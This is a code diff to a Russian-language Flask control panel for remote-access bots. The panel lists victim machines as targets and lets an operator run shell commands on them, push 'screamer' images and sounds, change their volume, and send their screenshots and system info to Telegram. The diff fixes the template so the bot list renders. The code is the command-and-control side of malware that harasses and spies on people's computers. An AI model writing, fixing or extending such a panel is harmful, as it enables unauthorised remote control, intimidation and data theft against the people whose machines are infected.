@@ -21,7 +21,7 @@ def load_aliases():
     if os.path.exists(ALIASES_FILE):
         with open(ALIASES_FILE, 'r', encoding='utf-8') as f:
             try: return json.load(f)
-            except json.JSONDecodeError: return {}
+            except json.JSONDecodeError:return {}
     return {}
 
 def save_aliases(data):
@@ -45,14 +45,14 @@ HTML_TEMPLATE = """
     body{font-family:monospace;background-color:#1a1a1a;color:#0f0; margin: 0; padding: 20px;} .container{width:95%; max-width: 1200px; margin:auto;} h1,h2,h3{text-align:center; border-bottom: 1px solid #0f0; padding-bottom: 10px;} .control-block{margin-top:20px;padding:15px;border:1px solid #0f0; border-radius: 5px;} select,input[type="text"]{width:100%;padding:10px;margin-bottom:10px;background-color:#333;color:#0f0;border:1px solid #0f0;box-sizing: border-box;} button{background-color:#0f0;color:#1a1a1a;padding:10px 15px;border:none;cursor:pointer;margin-right:10px; margin-top: 5px; transition: background-color 0.2s;} button:hover{background-color:#0c0;} pre{background-color:#000;padding:15px;border:1px solid #0f0;white-space:pre-wrap;word-wrap:break-word;min-height:50px;max-height: 300px; overflow-y: auto;} input[type="range"]{width: 80%; vertical-align: middle;} output{padding-left:10px;} .media-gallery { display: flex; flex-wrap: wrap; gap: 15px; justify-content: center; max-height: 400px; overflow-y: auto; padding: 10px; background-color: #000;} .media-gallery img { width: 120px; height: 120px; object-fit: cover; border: 2px solid #0f0; cursor: pointer; transition: transform 0.2s, border-color 0.2s; } .media-gallery img:hover { transform: scale(1.1); border-color: #ff0; } .audio-list { display: flex; flex-direction: column; gap: 8px; max-height: 250px; overflow-y: auto; padding-right: 10px;} .audio-item { background-color: #2a2a2a; padding: 10px; cursor: pointer; border-left: 4px solid #0f0; transition: background-color 0.2s; } .audio-item:hover { background-color: #444; }
 {% endraw %}</style>
 </head><body onload="initializePanel()">
-<div class="container"><h1>Панель управления v10 - Редактор</h1><h2>Активные боты: {{ bots|length }}</h2>
-{% if bots %}
+<div class="container"><h1>Панель управления v10 - Редактор</h1><h2>Активные боты: {{ bots_list|length }}</h2>
+{% if bots_list %}
     <div class="control-block"><h3>Цель</h3><select id="main_bot_select" onchange="onBotSelect()"></select></div>
     <div class="control-block"><h3>Редактор имени</h3><input type="text" id="alias_input" placeholder="Введите новый псевдоним цели..."><button onclick="renameBot()">Переименовать</button></div>
     <div class="control-block"><h3>Галерея скримеров</h3><div class="media-gallery" id="image_gallery"></div></div>
     <div class="control-block"><h3>Фонотека</h3><div class="audio-list" id="audio_list"></div></div>
     <div class="control-block"><h3>Выполнение команд</h3><input type="text" id="command_input" placeholder="Введите команду..."><button onclick="sendShellCommand('command_input')">Отправить</button></div>
-    <div class="control-block"><h3>Управление звуком</h3><label for="volume_slider">Громкость:</label><br><input type="range" id="volume_slider" min="0" max="100" value="50" oninput="sendControlCommand('setvolume ' + this.value)"><output id="volume_output">50%</output><br><br><button onclick="sendControlCommand('mute')">Mute</button><button onclick="sendControlCommand('unmute')">Unmute</button></div>
+    <div class="control-block"><h3>Управление звуком</h3><label for="volume_slider">Громкость:</label><br><input type="range" id="volume_slider" min="0" max="100" value="50" oninput="sendControlCommand('setvolume ' + this.value)"><output id="volume_output">50%</output><br><br&gt;<button onclick="sendControlCommand('mute')">Mute</button><button onclick="sendControlCommand('unmute')">Unmute</button></div>
     <div class="control-block"><h3>Специальные команды</h3><button onclick="sendShellCommand('sysinfo')">Получить инфо (в Telegram)</button><button onclick="sendControlCommand('screenshot')">Сделать скриншот (в Telegram)</button></div>
     <div class="control-block"><h3>Результат последней команды</h3><pre id="result_output_pre">Ожидание команды...</pre></div>
 {% else %}<p>Нет активных ботов.</p>{% endif %}
@@ -76,7 +76,6 @@ HTML_TEMPLATE = """
 
 # --- БЭКЕНД-ЧАСТЬ ---
 
-# ИСПРАВЛЕННАЯ СТРОКА ЗДЕСЬ
 @app.route('/files/<folder>/<filename>')
 def serve_files(folder, filename):
     directory = AUDIO_DIR if folder == 'audio' else IMAGE_DIR if folder == 'image' else None
@@ -84,9 +83,20 @@ def serve_files(folder, filename):
         return send_from_directory(directory, filename)
     return "Not Found", 404
 
+# --- ИЗМЕНЕННАЯ ФУНКЦИЯ ---
 @app.route('/')
 def index():
-    return render_template_string(HTML_TEMPLATE, bots_data=bots, image_files=image_files, audio_files=audio_files)
+    # СОЗДАЕМ КОПИЮ СЛОВАРЯ БОТОВ, БЕЗОПАСНУЮ ДЛЯ JSON
+    # Убираем несериализуемый объект 'ws'
+    bots_for_template = {
+        ip: {
+            'hostname': data['hostname'],
+            'alias': data['alias']
+        }
+        for ip, data in bots.items()
+    }
+    # Также передаем в шаблон простой список IP для проверки `{% if bots_list %}`
+    return render_template_string(HTML_TEMPLATE, bots_list=list(bots.keys()), bots_data=bots_for_template, image_files=image_files, audio_files=audio_files)
 
 @app.route('/api/rename', methods=['POST'])
 def api_rename():
